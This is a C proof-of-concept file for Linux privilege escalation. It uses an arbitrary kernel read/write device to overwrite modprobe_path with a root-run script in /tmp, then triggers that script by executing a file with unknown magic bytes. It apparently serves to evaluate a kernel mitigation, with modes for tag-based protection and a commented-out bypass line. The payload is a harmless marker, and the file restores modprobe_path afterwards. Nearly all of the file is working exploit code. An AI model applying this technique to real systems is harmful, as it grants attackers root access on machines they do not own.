// FZY: Add a simple privilege escalation proof of concept that overwrites the modprobe_path to execute a payload script when executing a file with unknown magic bytes

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define KMOD_PATH_LEN 256

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {
    .addr = addr,
    .data = data,
    .size = size
  };

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {
    .addr = addr,
    .data = data,
    .size = size
  };

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

void verify_modprobe_path_addr(int fd, unsigned long modprobe_path_addr) {
  printf("[+] modprobe_path address: 0x%lx\n", modprobe_path_addr);

  // Read current modprobe_path to verify if our address is correct
  FILE *f = fopen("/proc/sys/kernel/modprobe", "r");
  if (f) {
    char proc_modprobe_path[KMOD_PATH_LEN + 1];
    memset(proc_modprobe_path, 0, sizeof(proc_modprobe_path));
    if (fgets(proc_modprobe_path, KMOD_PATH_LEN, f)) {

      proc_modprobe_path[strcspn(proc_modprobe_path, "\n")] = 0;
      printf("[+] Current modprobe_path from /proc: '%s'\n", proc_modprobe_path);

      char kernel_modprobe_path[KMOD_PATH_LEN + 1];
      memset(kernel_modprobe_path, 0, sizeof(kernel_modprobe_path));

      arb_read(fd, modprobe_path_addr, kernel_modprobe_path, KMOD_PATH_LEN);
      printf("[+] modprobe_path from kernel memory: '%s'\n", kernel_modprobe_path);

      if (strncmp(proc_modprobe_path, kernel_modprobe_path, strlen(proc_modprobe_path)) == 0) {
        printf("[+] Address verification successful!\n");
      } else {
        printf("[!] Warning: Address verification failed!\n");
        exit(1);
      }
    }
    fclose(f);
  }
}

void create_payload() {
  printf("[+] Creating malicious modprobe replacement...\n");

  FILE *f = fopen("/tmp/evil_modprobe", "w");
  if (!f) {
    perror("fopen evil_modprobe");
    exit(1);
  }

  fprintf(f, "#!/bin/bash\n");
  fprintf(f, "echo 'Evil modprobe executed!' > /tmp/pwned\n");
  fprintf(f, "echo 'UID:' $(id -u) >> /tmp/pwned\n");
  fprintf(f, "echo 'GID:' $(id -g) >> /tmp/pwned\n");
  fprintf(f, "echo 'Effective User:' $(whoami) >> /tmp/pwned\n");
  // The payload runs as root and /tmp is sticky, so hand the marker back or
  // cleanup cannot unlink it.
  fprintf(f, "chown %d:%d /tmp/pwned\n", getuid(), getgid());

  fclose(f);

  chmod("/tmp/evil_modprobe", 0755);
  printf("[+] Malicious modprobe created at /tmp/evil_modprobe\n");  
}

static char orig_modprobe_path[KMOD_PATH_LEN + 1];

void overwrite_modprobe_path(int fd, unsigned long modprobe_path_addr) {
  char malicious_path[] = "/tmp/evil_modprobe";

  memset(orig_modprobe_path, 0, sizeof(orig_modprobe_path));
  arb_read(fd, modprobe_path_addr, orig_modprobe_path, KMOD_PATH_LEN);

  printf("[+] Overwriting modprobe_path at 0x%lx\n", modprobe_path_addr);
  printf("[+] New path: %s\n", malicious_path);

  // Write our malicious path
  arb_write(fd, modprobe_path_addr, malicious_path, strlen(malicious_path) + 1);

  printf("[+] modprobe_path overwritten!\n");
}

void trigger_modprobe() {
  printf("[+] Triggering modprobe to execute payload...\n");

  printf("[+] Creating file with unknown magic bytes at /tmp/unknown_file...\n");
    
  FILE *f = fopen("/tmp/unknown_file", "wb");
  if (!f) {
    perror("fopen unknown_file");
    return;
  }

  unsigned char unknown_magic[] = {0xff, 0xff, 0xff, 0xff};
  fwrite(unknown_magic, 1, sizeof(unknown_magic), f);
  fclose(f);
  
  chmod("/tmp/unknown_file", 0755);
  
  // Execute it to trigger modprobe
  printf("[+] Attempting to execute unknown file type...\n");
  char *argv[] = {"/tmp/unknown_file", NULL};
  char *envp[] = {NULL};
  execve("/tmp/unknown_file", argv, envp);
  
  printf("[+] Modprobe should have been triggered\n");
}

void verify_exploit() {
  printf("[+] Checking if exploit worked...\n");

  if (access("/tmp/pwned", F_OK) == 0) {
    printf("[+] Payload executed successfully!\n");
    system("cat /tmp/pwned");
  } else {
    printf("[-] Payload did not execute\n");
    return;
  }
}

// Without this every unknown-binfmt exec keeps running /tmp/evil_modprobe as root.
void restore_modprobe_path(int fd, unsigned long modprobe_path_addr) {
  char readback[KMOD_PATH_LEN + 1];

  memset(readback, 0, sizeof(readback));
  arb_write(fd, modprobe_path_addr, orig_modprobe_path,
            strlen(orig_modprobe_path) + 1);
  arb_read(fd, modprobe_path_addr, readback, KMOD_PATH_LEN);
  if (strcmp(readback, orig_modprobe_path) == 0)
    printf("[+] modprobe_path restored to '%s'\n", orig_modprobe_path);
  else
    printf("[-] modprobe_path restore failed, now: '%s'\n", readback);

  unlink("/tmp/pwned");
  unlink("/tmp/evil_modprobe");
  unlink("/tmp/unknown_file");
}

int main(int argc, char *argv[]) {
  printf("[+] Privilege escalation PoC by overwriting modprobe_path\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <modprobe_path_addr>\n", argv[0]);
    printf("\t- mode: 0 for no protection, 1 for Sensitivity Tag, "
           "2 for Sensitivity and TypeID Tag.\n");
    printf("\t- modprobe_path_addr: nm vmlinux | grep modprobe_path\n");
    return 1;
  }

  printf("[+] Opening /dev/arb_rw...\n");

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] Device opened successfully\n");
  printf("[+] Current UID: %d\n", getuid());

  create_payload();
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("Invalid mode. Use 0 for no protection, "
      "1 for protection with Sensitivity Tag, "
      "and 2 for protection with Sensitivity and TypeID Tag.\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long modprobe_path_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    // Get the address of modprobe_path from the kernel with arb_read, because we store the address of modprobe_path in the global variable and store the string content at unpredictable address
    arb_read(arbrw_dev_fd, modprobe_path_addr, &modprobe_path_addr, sizeof(unsigned long));

    printf("[+] modprobe_path address from kernel memory: 0x%lx\n", modprobe_path_addr);

    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // modprobe_path_addr = modprobe_path_addr | 0xFFFF000000000000;
  }
  
  verify_modprobe_path_addr(arbrw_dev_fd, modprobe_path_addr);

  overwrite_modprobe_path(arbrw_dev_fd, modprobe_path_addr);

  trigger_modprobe();

  verify_exploit();

  restore_modprobe_path(arbrw_dev_fd, modprobe_path_addr);

  close(arbrw_dev_fd);
  return 0;
}